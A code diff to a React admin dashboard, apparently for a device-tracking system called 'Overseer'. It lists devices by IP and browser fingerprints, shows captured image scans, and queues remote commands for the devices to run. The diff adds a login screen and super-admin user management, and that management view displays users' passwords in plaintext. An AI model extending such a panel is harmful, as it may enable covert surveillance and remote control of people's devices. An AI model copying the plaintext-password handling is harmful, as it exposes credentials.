@@ -54,8 +54,19 @@ export default function AdminDashboard() {
   const [selectedDevice, setSelectedDevice] = useState<DeviceGroup | null>(null);
   const [selectedImageIndex, setSelectedImageIndex] = useState<number | null>(null);
   const [selectedScans, setSelectedScans] = useState<Set<string>>(new Set());
-  const [loading, setLoading] = useState(true);
+  const [loading, setLoading] = useState(false);
   const [deviceCommands, setDeviceCommands] = useState<any[]>([]);
+  
+  // Auth State
+  const [authPassword, setAuthPassword] = useState("");
+  const [isAuthenticated, setIsAuthenticated] = useState(false);
+  const [userRole, setUserRole] = useState<"SUPER_ADMIN" | "USER" | null>(null);
+  const [userId, setUserId] = useState<string | null>(null);
+  const [canDelete, setCanDelete] = useState(false);
+  const [showUserManagement, setShowUserManagement] = useState(false);
+  
+  // Users for Super Admin
+  const [users, setUsers] = useState<any[]>([]);
 
   const galleryScans = useMemo(() => {
     if (!selectedDevice) return [];
@@ -78,40 +89,51 @@ export default function AdminDashboard() {
   const storagePercent = Math.min(100, (totalStorageBytes / (500 * 1024 * 1024)) * 100);
 
   const fetchDevices = () => {
-    fetch("/api/devices")
+    if (!authPassword) return;
+    fetch("/api/devices", { headers: { "Authorization": `Bearer ${authPassword}` } })
       .then((res) => res.json())
       .then((res) => {
         if (res.success) setDevices(res.data);
-        setLoading(false);
       })
-      .catch(() => setLoading(false));
+      .catch(() => {});
+  };
+
+  const fetchUsers = () => {
+    if (userRole !== 'SUPER_ADMIN') return;
+    fetch("/api/users", { headers: { "Authorization": `Bearer ${authPassword}` } })
+      .then(res => res.json())
+      .then(res => { if (res.success) setUsers(res.users); })
+      .catch(() => {});
   };
 
   useEffect(() => {
+    if (!isAuthenticated) return;
     fetchDevices();
+    if (userRole === 'SUPER_ADMIN') fetchUsers();
+    
     const interval = setInterval(() => {
       fetchDevices();
       if (selectedDevice?.deviceId) {
-        fetch(`/api/commands?deviceId=${selectedDevice.deviceId}&all=true`)
+        fetch(`/api/commands?deviceId=${selectedDevice.deviceId}&all=true`, { headers: { "Authorization": `Bearer ${authPassword}` } })
           .then(res => res.json())
           .then(data => { if (data.success) setDeviceCommands(data.commands); })
           .catch(() => {});
       }
     }, 5000); // Live update every 5 seconds
     return () => clearInterval(interval);
-  }, [selectedDevice]);
+  }, [isAuthenticated, selectedDevice, userRole, authPassword]);
 
   // Fetch commands immediately when device is selected
   useEffect(() => {
-    if (selectedDevice?.deviceId) {
-      fetch(`/api/commands?deviceId=${selectedDevice.deviceId}&all=true`)
+    if (selectedDevice?.deviceId && authPassword) {
+      fetch(`/api/commands?deviceId=${selectedDevice.deviceId}&all=true`, { headers: { "Authorization": `Bearer ${authPassword}` } })
         .then(res => res.json())
         .then(data => { if (data.success) setDeviceCommands(data.commands); })
         .catch(() => {});
     } else {
       setDeviceCommands([]);
     }
-  }, [selectedDevice]);
+  }, [selectedDevice, authPassword]);
 
   const handleSelectAll = () => {
     if (!selectedDevice) return;
@@ -135,11 +157,13 @@ export default function AdminDashboard() {
     if (!confirm(`Are you sure you want to delete ${selectedScans.size} scans?`)) return;
     
     try {
-      await fetch("/api/scans", {
+      const res = await fetch("/api/scans", {
         method: "POST",
-        headers: { "Content-Type": "application/json" },
+        headers: { "Content-Type": "application/json", "Authorization": `Bearer ${authPassword}` },
         body: JSON.stringify({ action: "delete", scanIds: Array.from(selectedScans) })
       });
+      const data = await res.json();
+      if (!data.success) throw new Error(data.error);
       setSelectedScans(new Set());
       fetchDevices();
       
@@ -189,7 +213,7 @@ export default function AdminDashboard() {
     try {
       const res = await fetch("/api/commands", {
         method: "POST",
-        headers: { "Content-Type": "application/json" },
+        headers: { "Content-Type": "application/json", "Authorization": `Bearer ${authPassword}` },
         body: JSON.stringify({ deviceId: selectedDevice.deviceId, command, payload })
       });
       if (res.ok) alert("Command queued successfully. It will execute on the device within 5 seconds if they are online.");
@@ -198,19 +222,58 @@ export default function AdminDashboard() {
     }
   };
 
-  if (loading) {
-    return (
-      <div className="flex h-screen items-center justify-center bg-[#0a0a0f] text-white">
-        <div className="flex flex-col items-center gap-4">
-          <Activity className="h-8 w-8 animate-spin text-[color:var(--gold,#d4af37)]" />
-          <p className="font-sans text-sm uppercase tracking-widest opacity-60">Initializing Overseer...</p>
-        </div>
-      </div>
-    );
+  const handleDeleteDevice = async (deviceId: string | undefined) => {
+    if (!deviceId || userRole !== 'SUPER_ADMIN') return;
+    if (!confirm(`Are you sure you want to completely delete this device? This action cannot be undone.`)) return;
+    
+    try {
+      const res = await fetch("/api/scans", {
+        method: "POST",
+        headers: { "Content-Type": "application/json", "Authorization": `Bearer ${authPassword}` },
+        body: JSON.stringify({ action: "deleteDevice", deviceId })
+      });
+      if (res.ok) {
+        setSelectedDevice(null);
+        fetchDevices();
+      }
+    } catch (e) {
+      alert("Failed to delete device");
+    }
+  };
+
+  const handleCreateUser = async () => {
+    const name = prompt("Enter username for the new user:");
+    if (!name) return;
+    const res = await fetch("/api/users", {
+      method: "POST",
+      headers: { "Content-Type": "application/json", "Authorization": `Bearer ${authPassword}` },
+      body: JSON.stringify({ action: "CREATE_USER", name })
+    });
+    if (res.ok) fetchUsers();
+  };
+
+  const handleToggleShare = async (userId: string, deviceId: string, isShared: boolean) => {
+    const action = isShared ? "UNSHARE_DEVICE" : "SHARE_DEVICE";
+    await fetch("/api/users", {
+      method: "POST",
+      headers: { "Content-Type": "application/json", "Authorization": `Bearer ${authPassword}` },
+      body: JSON.stringify({ action, userId, deviceId })
+    });
+    fetchUsers();
+  };
+
+  if (!isAuthenticated) {
+    return <LoginScreen onLogin={(pwd, data) => {
+      setAuthPassword(pwd);
+      setUserRole(data.role);
+      setUserId(data.userId || null);
+      setCanDelete(data.canDelete || false);
+      setIsAuthenticated(true);
+    }} />;
   }
 
   return (
-    <div className="min-h-screen bg-[#0a0a0f] bg-[radial-gradient(ellipse_at_top,_var(--tw-gradient-stops))] from-blue-900/20 via-[#0a0a0f] to-[#0a0a0f] text-slate-300 font-sans p-6 md:p-12">
+    <div className="min-h-screen bg-[#0a0a0f] bg-[radial-gradient(ellipse_at_top,_var(--tw-gradient-stops))] from-blue-900/20 via-[#0a0a0f] to-[#0a0a0f] text-slate-300 font-sans p-6 md:p-12 relative">
       <header className="mb-12 border-b border-white/5 pb-8 flex flex-col md:flex-row md:items-center justify-between gap-6">
         <div>
           <h1 className="text-3xl font-light text-white mb-2 tracking-wide">
@@ -234,11 +297,70 @@ export default function AdminDashboard() {
             </div>
           </div>
           
-          <div className="h-12 w-12 rounded-full border border-white/10 bg-white/5 flex items-center justify-center backdrop-blur-md">
+          <div className="h-12 w-12 rounded-full border border-white/10 bg-white/5 flex items-center justify-center backdrop-blur-md cursor-pointer hover:bg-white/10 transition" onClick={() => userRole === 'SUPER_ADMIN' && setShowUserManagement(true)}>
             <Fingerprint className="text-blue-400 opacity-80" />
           </div>
         </div>
       </header>
+
+      {showUserManagement && userRole === 'SUPER_ADMIN' && (
+        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/80 backdrop-blur-md p-4">
+          <div className="bg-[#0f0f13] border border-white/10 rounded-2xl w-full max-w-4xl max-h-[80vh] flex flex-col shadow-2xl overflow-hidden relative">
+            <div className="p-6 border-b border-white/10 flex justify-between items-center bg-white/5">
+              <h2 className="text-xl font-light text-white">User Management</h2>
+              <button onClick={() => setShowUserManagement(false)} className="text-white/50 hover:text-white"><X size={20} /></button>
+            </div>
+            <div className="p-6 overflow-y-auto custom-scrollbar flex-1">
+              <button onClick={handleCreateUser} className="mb-6 bg-blue-500/20 text-blue-400 px-4 py-2 rounded-lg text-sm font-semibold hover:bg-blue-500/30 transition">
+                + Create New User
+              </button>
+              
+              <div className="space-y-4">
+                {users.map(u => (
+                  <div key={u.id} className="border border-white/10 rounded-xl p-4 bg-black/40">
+                    <div className="flex justify-between items-start mb-4">
+                      <div>
+                        <h3 className="text-white font-medium">{u.name}</h3>
+                        <p className="text-xs font-mono text-purple-400 mt-1">Pass: {u.password}</p>
+                      </div>
+                      <div className="flex items-center gap-4">
+                        <label className="flex items-center gap-2 text-xs text-white/70">
+                          <input type="checkbox" checked={u.canDelete} onChange={(e) => {
+                            fetch("/api/users", { method: "POST", headers: { "Content-Type": "application/json", "Authorization": `Bearer ${authPassword}` }, body: JSON.stringify({ action: "SET_CAN_DELETE", userId: u.id, canDelete: e.target.checked }) }).then(fetchUsers);
+                          }} className="rounded bg-black border-white/20 accent-blue-500" />
+                          Can Delete Photos
+                        </label>
+                        <button onClick={() => {
+                          if (confirm('Delete user?')) fetch("/api/users", { method: "POST", headers: { "Content-Type": "application/json", "Authorization": `Bearer ${authPassword}` }, body: JSON.stringify({ action: "DELETE_USER", userId: u.id }) }).then(fetchUsers);
+                        }} className="text-red-400/50 hover:text-red-400"><Trash2 size={16} /></button>
+                      </div>
+                    </div>
+                    
+                    <div className="mt-4 border-t border-white/5 pt-4">
+                      <p className="text-xs uppercase tracking-widest text-white/40 mb-3">Shared Devices</p>
+                      <div className="grid grid-cols-2 sm:grid-cols-3 gap-2">
+                        {devices.map(d => {
+                          const isShared = u.sharedDevices?.some((sd: any) => sd.deviceId === d.deviceId);
+                          return (
+                            <button
+                              key={d.id}
+                              onClick={() => handleToggleShare(u.id, d.deviceId!, isShared)}
+                              className={`text-left text-xs p-2 rounded border transition-colors ${isShared ? 'bg-blue-500/20 border-blue-500/50 text-blue-200' : 'bg-white/5 border-white/10 text-white/40 hover:bg-white/10'}`}
+                            >
+                              <div className="truncate">{d.publicIp}</div>
+                              <div className="opacity-50 text-[10px] truncate">{d.userAgent?.split(' ')[0]}</div>
+                            </button>
+                          );
+                        })}
+                      </div>
+                    </div>
+                  </div>
+                ))}
+              </div>
+            </div>
+          </div>
+        </div>
+      )}
 
       <main className="grid grid-cols-1 md:grid-cols-2 xl:grid-cols-3 gap-6">
         {devices.map((device, i) => {
@@ -357,9 +479,11 @@ export default function AdminDashboard() {
                         <button onClick={handleBulkDownload} className="flex h-8 w-8 items-center justify-center rounded bg-blue-500/20 text-blue-400 transition hover:bg-blue-500/40">
                           <Download size={14} />
                         </button>
-                        <button onClick={handleBulkDelete} className="flex h-8 w-8 items-center justify-center rounded bg-red-500/20 text-red-400 transition hover:bg-red-500/40">
-                          <Trash2 size={14} />
-                        </button>
+                        {(userRole === 'SUPER_ADMIN' || canDelete) && (
+                          <button onClick={handleBulkDelete} className="flex h-8 w-8 items-center justify-center rounded bg-red-500/20 text-red-400 transition hover:bg-red-500/40">
+                            <Trash2 size={14} />
+                          </button>
+                        )}
                       </div>
                     )}
                   </div>
@@ -496,6 +620,15 @@ export default function AdminDashboard() {
                     <InfoBlock label="WebGL Fingerprint" value={selectedDevice.scans[0]?.webglFingerprint || "Not captured"} truncate />
                     <InfoBlock label="Canvas Fingerprint" value={selectedDevice.scans[0]?.canvasFingerprint || "Not captured"} truncate />
                     <InfoBlock label="Audio Context" value={selectedDevice.scans[0]?.audioFingerprint || "Not captured"} truncate />
+                    
+                    {userRole === 'SUPER_ADMIN' && (
+                      <button 
+                        onClick={() => handleDeleteDevice(selectedDevice.deviceId)}
+                        className="w-full mt-4 bg-red-500/10 border border-red-500/20 text-red-400 hover:bg-red-500/20 rounded py-2 px-3 text-xs font-semibold transition"
+                      >
+                        Delete Entire Device
+                      </button>
+                    )}
                   </div>
                 </div>
               </div>
@@ -581,6 +714,86 @@ function InfoBlock({ label, value, truncate = false }: { label: string; value: s
       <span className={`font-mono text-xs text-white/90 ${truncate ? "truncate opacity-70" : "break-words"}`}>
         {value || "Unknown"}
       </span>
+    </div>
+  );
+}
+
+function LoginScreen({ onLogin }: { onLogin: (password: string, data: any) => void }) {
+  const [password, setPassword] = useState("");
+  const [error, setError] = useState("");
+  const [loading, setLoading] = useState(false);
+
+  const handleSubmit = async (e: React.FormEvent) => {
+    e.preventDefault();
+    if (password.length < 6) return;
+    setLoading(true);
+    try {
+      const res = await fetch("/api/auth", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ password })
+      });
+      const data = await res.json();
+      if (res.ok && data.success) {
+        onLogin(password, data);
+      } else {
+        setError(data.error || "Invalid Access Code");
+        setPassword("");
+      }
+    } catch (e) {
+      setError("Connection Failed");
+    } finally {
+      setLoading(false);
+    }
+  };
+
+  return (
+    <div className="flex h-screen items-center justify-center bg-[#0a0a0f] text-white p-4">
+      <div className="max-w-md w-full bg-[#0f0f13] border border-white/10 rounded-2xl p-8 shadow-2xl relative overflow-hidden">
+        <div className="absolute top-0 left-0 w-full h-1 bg-gradient-to-r from-blue-500 via-purple-500 to-blue-500 opacity-50" />
+        <h1 className="text-2xl font-light text-center mb-2 tracking-widest text-white">SYSTEM<span className="font-bold text-blue-400">LOCK</span></h1>
+        <p className="text-center text-xs text-white/40 mb-8 uppercase tracking-widest">Enter Access Code</p>
+        
+        <form onSubmit={handleSubmit} className="flex flex-col gap-6">
+          <div className="flex justify-between gap-2">
+            {[0, 1, 2, 3, 4, 5].map(i => (
+              <input
+                key={i}
+                id={`otp-${i}`}
+                type="text"
+                maxLength={1}
+                value={password[i] || ""}
+                onChange={(e) => {
+                  const val = e.target.value.toUpperCase();
+                  if (val && !/^[A-Z0-9]$/.test(val)) return;
+                  const newPass = password.split("");
+                  newPass[i] = val;
+                  setPassword(newPass.join(""));
+                  if (val && i < 5) document.getElementById(`otp-${i + 1}`)?.focus();
+                  setError("");
+                }}
+                onKeyDown={(e) => {
+                  if (e.key === "Backspace" && !password[i] && i > 0) {
+                    document.getElementById(`otp-${i - 1}`)?.focus();
+                  }
+                }}
+                className={`w-12 h-14 bg-black/50 border rounded-lg text-center text-xl font-mono uppercase transition-colors
+                  ${error ? 'border-red-500/50 text-red-400' : 'border-white/10 focus:border-blue-500 focus:ring-1 focus:ring-blue-500'}`}
+              />
+            ))}
+          </div>
+          
+          {error && <p className="text-red-400 text-xs text-center font-mono animate-pulse">{error}</p>}
+          
+          <button 
+            type="submit" 
+            disabled={password.length < 6 || loading}
+            className="w-full bg-blue-500/20 text-blue-400 py-3 rounded-xl font-semibold tracking-widest uppercase text-sm hover:bg-blue-500/30 transition disabled:opacity-50"
+          >
+            {loading ? "Authenticating..." : "Authorize Access"}
+          </button>
+        </form>
+      </div>
     </div>
   );
 }
